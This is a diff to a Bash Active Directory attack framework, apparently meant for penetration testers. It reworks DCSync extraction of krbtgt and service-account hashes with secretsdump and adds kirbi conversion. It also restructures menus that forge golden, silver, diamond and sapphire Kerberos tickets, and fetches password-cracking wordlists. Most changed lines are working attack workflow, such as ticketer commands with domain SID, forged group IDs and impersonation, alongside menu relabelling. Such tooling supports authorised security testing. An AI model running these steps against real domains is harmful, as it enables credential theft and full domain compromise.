@@ -60,6 +60,8 @@ impacket_smbserver=$(which smbserver.py)
 if [ ! -f "${impacket_smbserver}" ]; then impacket_smbserver=$(which impacket-smbserver); fi
 impacket_ticketer=$(which ticketer.py)
 if [ ! -f "${impacket_ticketer}" ]; then impacket_ticketer=$(which impacket_ticketer); fi
+impacket_ticketconverter=$(which ticketConverter.py)
+if [ ! -f "${impacket_ticketconverter}" ]; then impacket_ticketconverter=$(which impacket_ticketconverter); fi
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -2238,20 +2240,24 @@ bitlocker_dump () {
     echo -e ""
 }
 
-get_hash_krbtgt (){
+get_hash (){
     if [ ! -f "${impacket_secretsdump}" ] ; then
         echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
     else
-        if [ ! -f "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" ]; then
-            echo -e "${BLUE}[*] Extracting NTLM hash and AES keys of krbtgt${NC}"
+        gethash_nt=""
+        gethash_aes=""
+        if [ ! -f "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" ]; then
+            echo -e "${BLUE}[*] Extracting NTLM hash and AES keys of ${gethash_user}${NC}"
             if [ "${nullsess_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
             else
-                run_command "${impacket_secretsdump} ${argument_imp}@${target} -just-dc-user $(echo ${domain} | cut -d "." -f 1)/krbtgt" | tee ${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt
+                run_command "${impacket_secretsdump} ${argument_imp}@${target} -just-dc-user $(echo ${domain} | cut -d "." -f 1)/${gethash_user}" | tee ${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt
             fi
+        else
+             echo -e "${YELLOW}[i] Hash file of ${gethash_user} found, skipping... ${NC}"
         fi
-        krbtgt_nt=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep krbtgt |grep -v "aes\|des" | cut -d ":" -f 4)
-        krbtgt_aes=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep aes256 | cut -d ":" -f 3)
+        gethash_nt=$(/bin/cat "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" | grep ${gethash_user} |grep -v "aes\|des" | cut -d ":" -f 4)
+        gethash_aes=$(/bin/cat "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" | grep aes256 | cut -d ":" -f 3)
     fi
     echo -e ""
 }
@@ -2327,10 +2333,10 @@ ldapper_console (){
             echo -e "9.1) Search for specific User SPN (You will be prompted for the User Principle Name)"
             echo -e "10.1) Search for specific Workstation LAPS Password (You will be prompted for the Workstation Name)"
             echo -e "*) Run custom Query (e.g. (&(objectcategory=user)(serviceprincipalname=*))"
-            echo -e "Back) Back"
+            echo -e "back) Go back"
 
             read -p "> " custom_option </dev/tty
-            if [[ ! ${custom_option} == "Back" ]]; then
+            if [[ ! ${custom_option} == "back" ]]; then
                 run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -s ${custom_option} | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
             else
                 console_menu
@@ -2430,7 +2436,7 @@ modify_target () {
     echo -e "2) All domain servers"
     echo -e "3) File containing list of servers"
     echo -e "4) IP or hostname"
-    echo -e "99) Back"
+    echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
 
@@ -2477,7 +2483,7 @@ modify_target () {
         done
         ;;
 
-        99)
+        back)
         ;;
 
         *)
@@ -2541,7 +2547,7 @@ ad_menu() {
     echo -e "18) Enumeration of RDWA servers"
     echo -e "19) SCCM Enumeration using sccmhunter"
     echo -e "20) LDAP Enumeration using LDAPPER"
-    echo -e "99) Back"
+    echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
 
@@ -2638,7 +2644,7 @@ ad_menu() {
         ldapper_enum
         ad_menu;;
 
-        99)
+        back)
         main_menu
         ;;
 
@@ -2665,7 +2671,7 @@ kerberos_menu () {
     echo -e "8) Cracking Kerberoast hashes using john the ripper"
     echo -e "9) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
     echo -e "10) Run custom Kerberoast attack using Orpheus"
-    echo -e "99) Back"
+    echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
 
@@ -2725,7 +2731,7 @@ kerberos_menu () {
         kerberos_menu
         ;;
 
-        99)
+        back)
         main_menu
         ;;
 
@@ -2749,7 +2755,7 @@ shares_menu () {
     echo -e "3) SMB shares Spidering using netexec "
     echo -e "4) SMB shares Scan using FindUncommonShares"
     echo -e "5) SMB shares Scan using manspider"
-    echo -e "99) Back"
+    echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
 
@@ -2789,7 +2795,7 @@ shares_menu () {
         shares_menu
         ;;
 
-        99)
+        back)
         main_menu
         ;;
 
@@ -2825,7 +2831,7 @@ vulns_menu () {
     echo -e "14) RPC Dump and check for interesting protocols"
     echo -e "15) Coercer RPC scan"
     echo -e "16) Certifried check"
-    echo -e "99) Back"
+    echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
 
@@ -2920,7 +2926,7 @@ vulns_menu () {
         vulns_menu
         ;;
 
-        99)
+        back)
         main_menu
         ;;
 
@@ -2960,7 +2966,7 @@ pwd_menu () {
     echo -e "19) Dump Veeam credentials (only from Veeam server)"
     echo -e "20) Dump Msol password (only from Azure AD-Connect server)"
     echo -e "21) Extract Bitlocker Keys"
-    echo -e "99) Back"
+    echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
 
@@ -3080,7 +3086,7 @@ pwd_menu () {
         pwd_menu
         ;;
 
-        99)
+        back)
         main_menu
         ;;
 
@@ -3101,7 +3107,7 @@ console_menu () {
     echo -e "3) p0dalirius' LDAP Monitor"
     echo -e "4) garrettfoster13's ACED"
     echo -e "5) LDAPPER custom options"
-    echo -e "99) Back"
+    echo -e "back) Go back"
 
     read -p "> " option_selected </dev/tty
 
@@ -3131,7 +3137,7 @@ console_menu () {
         console_menu
 
         ;;
-        99)
+        back)
         main_menu
         ;;
 
@@ -3178,7 +3184,6 @@ auth_menu () {
     echo -e ""
     echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------"
-    echo -e "ENTER) Go back to Init Menu"
     echo -e "1) Generate and use NTLM hash of current user (requires: password) - Pass the hash"
     echo -e "2) Crack NTLM hash of current user and use password (requires: NTLM hash)"
     echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
@@ -3188,6 +3193,7 @@ auth_menu () {
     echo -e "7) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
     echo -e "8) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
     echo -e "9) Generate Sapphire Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "back) Go back to Init Menu"
 
     read -p "> " option_selected </dev/tty
 
@@ -3348,32 +3354,52 @@ auth_menu () {
                     echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
                     read -p ">> " ntlm_or_aes </dev/tty
                 done
-                get_hash_krbtgt
-                if [[ ${ntlm_or_aes} -eq 1 ]]; then krbtgt_key="-nthash ${krbtgt_nt}"; else krbtgt_key="-aesKey ${krbtgt_aes}"; fi
-
-                tick_randuser="sql_svc"
-                tick_user_id=""
-                tick_groups=""
-                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
-                read -p ">> " tick_randuser_value </dev/tty
-                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                echo -e "Please specify custom user id (press Enter to skip):"
-                read -p ">> " tick_user_id_value </dev/tty
-                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
-                echo -e "Please specify comma separated custom groups ids (e.g. '512,513,518,519,520') (press Enter to skip):"
-                read -p ">> " tick_group_ids_value </dev/tty
-                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
-
-                echo -e "${CYAN}[*] Generating golden ticket...${NC}"
-                current_dir=$(pwd)
-                cd ${output_dir}/Credentials
-                run_command "${impacket_ticketer} ${krbtgt_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
-                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
-                cd ${current_dir}
-                if [ -f "${output_dir}/Credentials/${tick_randuser}_golden.ccache" ]; then
-                    echo -e "${GREEN}[+] Golden ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_golden.ccache"
+                gethash_user="krbtgt"
+                gethash_hash=""
+                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DA rights):"
+                read -p ">> " gethash_hash </dev/tty
+                if [[ ${gethash_hash} == "" ]]; then 
+                    get_hash
                 else
-                    echo -e "${RED}[-] Failed to generate golden ticket${NC}"
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi 
+                fi
+
+                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+                else
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi                
+
+                    tick_randuser="Administrator"
+                    tick_user_id=""
+                    tick_groups=""
+                    echo -e "Please specify random user name (press Enter to choose default value 'Administrator'):"
+                    read -p ">> " tick_randuser_value </dev/tty
+                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                    echo -e "Please specify custom user id (press Enter to skip):"
+                    read -p ">> " tick_user_id_value </dev/tty
+                    if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
+                    echo -e "Please specify comma separated custom groups ids (e.g. '512,513,518,519,520') (press Enter to skip):"
+                    read -p ">> " tick_group_ids_value </dev/tty
+                    if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
+                    while [[ "${sid_domain}" == "" ]]; do
+                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                        read -p ">> " sid_domain </dev/tty
+                    done
+                    echo -e "${CYAN}[*] Generating golden ticket...${NC}"
+                    current_dir=$(pwd)
+                    cd ${output_dir}/Credentials
+                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
+                    run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
+                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
+                    /bin/mv "./${tick_randuser}.kirbi" "./${tick_randuser}_golden.kirbi" 2>/dev/null
+                    cd ${current_dir}
+                    if [ -f "${output_dir}/Credentials/${tick_randuser}_golden.ccache" ]; then
+                        echo -e "${GREEN}[+] Golden ticket generated successfully:${NC}"
+                        echo -e "${output_dir}/Credentials/${tick_randuser}_golden.ccache"
+                        echo -e "${output_dir}/Credentials/${tick_randuser}_golden.kirbi"
+                    else
+                        echo -e "${RED}[-] Failed to generate golden ticket${NC}"
+                    fi
                 fi
             else
                 echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
@@ -3387,36 +3413,70 @@ auth_menu () {
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
             if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+                tick_randuser="Administrator"
+                tick_randuserid="500"
+                tick_spn="CIFS/${dc_domain}"
+                tick_groups=""
+                tick_servuser=""
+
+                echo -e "Please specify name of SPN account (for example 'sql_svc'):"
+                read -p ">> " tick_servuser </dev/tty
+                while [[ "${tick_servuser}" == "" ]] ; do
+                    echo -e "${RED}Invalid username.${NC} Please specify another:"
+                    read -p ">> " tick_servuser </dev/tty
+                done
+
                 echo -e "Please specify '1' for NTLM and '2' for AES:"
                 read -p ">> " ntlm_or_aes </dev/tty
                 while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
                     echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
                     read -p ">> " ntlm_or_aes </dev/tty
                 done
-                get_hash_krbtgt
-                if [[ ${ntlm_or_aes} -eq 1 ]]; then krbtgt_key="-nthash ${krbtgt_nt}"; else krbtgt_key="-aesKey ${krbtgt_aes}"; fi
-
-                tick_randuser="sql_svc"
-                tick_spn="CIFS/${dc_domain}"
-                tick_groups=""
-                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
-                read -p ">> " tick_randuser_value </dev/tty
-                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
-                read -p ">> " tick_spn_value </dev/tty
-                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
-
-                echo -e "${CYAN}[*] Generating silver ticket for service $spn...${NC}"
-                current_dir=$(pwd)
-                cd ${output_dir}/Credentials
-                run_command "${impacket_ticketer} ${krbtgt_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuser}"
-                ticket_out="${tick_randuser}_silver_$(echo ${tick_spn} | sed 's/\//_/g').ccache"
-                /bin/mv "./${tick_randuser}.ccache" "./${ticket_out}" 2>/dev/null
-                cd ${current_dir}
-                if [ -f "${output_dir}/Credentials/${ticket_out}" ]; then
-                    echo -e "${GREEN}[+] silver ticket generated successfully:${NC} ${output_dir}/Credentials/${ticket_out}"
+                gethash_hash=""
+                echo -e "Please specify the NTLM or AES hash of the SPN account (press Enter to extract hash from NTDS (requires DA rights):"
+                read -p ">> " gethash_hash </dev/tty
+                if [[ ${gethash_hash} == "" ]]; then
+                    gethash_user=$tick_servuser
+                    get_hash
                 else
-                    echo -e "${RED}[-] Failed to generate silver ticket${NC}"
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi 
+                fi
+
+                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+                else
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi                
+
+                    echo -e "Please specify random user name (press Enter to choose default value 'Administrator'):"
+                    read -p ">> " tick_randuser_value </dev/tty
+                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                    echo -e "Please specify the chosen user's (press Enter to choose default value '500'):"
+                    read -p ">> " tick_randuserid_value </dev/tty
+                    if [[ ! ${tick_randuserid_value} == "" ]]; then tick_randuserid="${tick_randuserid_value}"; fi
+                    echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                    read -p ">> " tick_spn_value </dev/tty
+                    if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
+                    while [[ "${sid_domain}" == "" ]]; do
+                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                        read -p ">> " sid_domain </dev/tty
+                    done
+                    echo -e "${CYAN}[*] Generating silver ticket for service $spn...${NC}"
+                    current_dir=$(pwd)
+                    cd ${output_dir}/Credentials
+                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} -user-id ${tick_randuserid} ${tick_randuser}"
+                    ticket_ccache_out="${tick_randuser}_silver_$(echo ${tick_spn} | sed 's/\//_/g').ccache"
+                    ticket_kirbi_out="${tick_randuser}_silver_$(echo ${tick_spn} | sed 's/\//_/g').kirbi"
+                    run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
+                    /bin/mv "./${tick_randuser}.ccache" "./${ticket_ccache_out}" 2>/dev/null
+                    /bin/mv "./${tick_randuser}.kirbi" "./${ticket_kirbi_out}" 2>/dev/null
+                    cd ${current_dir}
+                    if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
+                        echo -e "${GREEN}[+] Silver ticket generated successfully:${NC}"
+                        echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
+                        echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
+                    else
+                        echo -e "${RED}[-] Failed to generate silver ticket${NC}"
+                    fi
                 fi
             else
                 echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
@@ -3430,31 +3490,47 @@ auth_menu () {
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
             if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
-                get_hash_krbtgt
-                krbtgt_key="-nthash ${krbtgt_nt} -aesKey ${krbtgt_aes}"
-                tick_randuser="sql_svc"
-                tick_user_id="1337"
-                tick_groups="512,513,518,519,520"
-                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
-                read -p ">> " tick_randuser_value </dev/tty
-                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
-                read -p ">> " tick_user_id_value </dev/tty
-                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
-                echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
-                read -p ">> " tick_group_ids_value </dev/tty
-                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
-
-                echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
-                current_dir=$(pwd)
-                cd ${output_dir}/Credentials
-                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${krbtgt_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
-                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
-                cd ${current_dir}
-                if [ -f "${output_dir}/Credentials/${tick_randuser}_diamond.ccache" ]; then
-                    echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache"
+                gethash_user="krbtgt"
+                gethash_hash=""
+                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DA rights):"
+                read -p ">> " gethash_hash </dev/tty
+                if [[ ${gethash_hash} == "" ]]; then 
+                    get_hash
                 else
-                    echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi 
+                fi
+
+                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+                else
+                    gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
+                    tick_randuser="sql_svc"
+                    tick_user_id="1337"
+                    tick_groups="512,513,518,519,520"
+                    echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                    read -p ">> " tick_randuser_value </dev/tty
+                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                    echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
+                    read -p ">> " tick_user_id_value </dev/tty
+                    if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
+                    echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                    read -p ">> " tick_group_ids_value </dev/tty
+                    if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
+                    while [[ "${sid_domain}" == "" ]]; do
+                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                        read -p ">> " sid_domain </dev/tty
+                    done
+                    echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
+                    current_dir=$(pwd)
+                    cd ${output_dir}/Credentials
+                    run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
+                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
+                    cd ${current_dir}
+                    if [ -f "${output_dir}/Credentials/${tick_randuser}_diamond.ccache" ]; then
+                        echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache"
+                    else
+                        echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
+                    fi
                 fi
             else
                 echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
@@ -3467,45 +3543,61 @@ auth_menu () {
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
-                get_hash_krbtgt
-                krbtgt_key="-nthash ${krbtgt_nt} -aesKey ${krbtgt_aes}"
-                tick_randuser="sql_svc"
-                tick_user_id="1337"
-                tick_groups="512,513,518,519,520"
-                tick_domain_admin="${user}"
-                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
-                read -p ">> " tick_randuser_value </dev/tty
-                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
-                read -p ">> " tick_user_id_value </dev/tty
-                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
-                echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
-                read -p ">> " tick_group_ids_value </dev/tty
-                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
-                echo -e "Please specify domain admin to impersonate (press Enter to choose default value current user):"
-                read -p ">> " tick_domain_admin_value </dev/tty
-                if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
-
-                echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
-                current_dir=$(pwd)
-                cd ${output_dir}/Credentials
-                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${krbtgt_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
-                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
-                cd ${current_dir}
-                if [ -f "${output_dir}/Credentials/${tick_randuser}_sapphire.ccache" ]; then
-                    echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache"
+            if [ "${pass_bool}" == true ] ; then
+                gethash_user="krbtgt"
+                gethash_hash=""
+                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DA rights):"
+                read -p ">> " gethash_hash </dev/tty
+                if [[ ${gethash_hash} == "" ]]; then 
+                    get_hash
                 else
-                    echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
+                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi 
+                fi
+
+                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+                else
+                    gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
+                    tick_randuser="sql_svc"
+                    tick_user_id="1337"
+                    tick_groups="512,513,518,519,520"
+                    tick_domain_admin="${user}"
+                    echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                    read -p ">> " tick_randuser_value </dev/tty
+                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                    echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
+                    read -p ">> " tick_user_id_value </dev/tty
+                    if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
+                    echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                    read -p ">> " tick_group_ids_value </dev/tty
+                    if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
+                    echo -e "Please specify domain admin to impersonate (press Enter to choose default value current user):"
+                    read -p ">> " tick_domain_admin_value </dev/tty
+                    if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
+                    while [[ "${sid_domain}" == "" ]]; do
+                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                        read -p ">> " sid_domain </dev/tty
+                    done
+                    echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
+                    current_dir=$(pwd)
+                    cd ${output_dir}/Credentials
+                    run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
+                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
+                    cd ${current_dir}
+                    if [ -f "${output_dir}/Credentials/${tick_randuser}_sapphire.ccache" ]; then
+                        echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache"
+                    else
+                        echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
+                    fi
                 fi
             else
-                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+                echo -e "${RED}[-] Error! Requires password...${NC}"
             fi
         fi
         auth_menu
         ;;
 
-        "")
+        back)
         init_menu
         ;;
 
@@ -3520,7 +3612,6 @@ config_menu () {
     echo -e ""
     echo -e "${YELLOW}[Config menu]${NC} Please choose from the following options:"
     echo -e "------------------------------------------------------"
-    echo -e "ENTER) Go back to Init Menu"
     echo -e "1) Check installation of tools and dependencies"
     echo -e "2) Synchronize time with Domain Controller (requires root)"
     echo -e "3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
@@ -3530,6 +3621,7 @@ config_menu () {
     echo -e "7) Change passwords wordlist file"
     echo -e "8) Change attacker's IP"
     echo -e "9) Show session information"
+    echo -e "back) Go back to Init Menu"
 
     read -p "> " option_selected </dev/tty
 
@@ -3630,14 +3722,14 @@ config_menu () {
         /bin/rm "${wordlists_dir}/rockyou.txt.tar"
         wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt" -O "${wordlists_dir}/cirt-default-usernames.txt"
         pass_wordlist="${wordlists_dir}/rockyou.txt"
-        users_wordlist="${wordlists_dir}/xato-net-10-million-usernames.txt"
+        user_wordlist="${wordlists_dir}/xato-net-10-million-usernames.txt"
         echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
         config_menu
         ;;
 
         6)
         echo -e "Please specify new users wordlist file:"
-        read -p ">> " users_wordlist </dev/tty
+        read -p ">> " user_wordlist </dev/tty
         echo -e "${GREEN}[+] Users wordlist file updated${NC}"
         config_menu
         ;;
@@ -3661,7 +3753,7 @@ config_menu () {
         config_menu
         ;;
 
-        "")
+        back)
         init_menu
         ;;
 
@@ -3684,7 +3776,8 @@ main_menu () {
     echo -e "6) Password Dump Menu"
     echo -e "7) Run MSSQL Enumeration"
     echo -e "8) LDAP Console Menu"
-    echo -e "99) Quit"
+    echo -e "back) Go back to Init Menu"
+    echo -e "exit) Exit"
 
     read -p "> " option_selected </dev/tty
 
@@ -3726,7 +3819,11 @@ main_menu () {
         main_menu
         ;;
 
-        99)
+        back)
+        init_menu
+        ;; 
+
+        exit)
         exit 1
         ;;
 
